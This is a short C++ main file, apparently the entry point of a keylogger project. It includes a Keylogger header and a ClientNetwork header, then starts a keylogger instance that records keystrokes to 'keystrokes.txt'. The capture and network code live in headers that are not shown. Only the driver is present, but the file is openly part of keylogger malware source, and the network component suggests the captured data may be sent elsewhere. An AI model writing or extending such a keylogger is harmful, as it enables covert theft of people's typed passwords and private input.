#include"../lib/ClientNetwork.hpp"
#include "../lib/Keylogger.hpp"
#include <iostream>

int main() {
    Keylogger* keylogger = Keylogger::getInstance("keystrokes.txt");
    keylogger->Run();
    return 0;
}

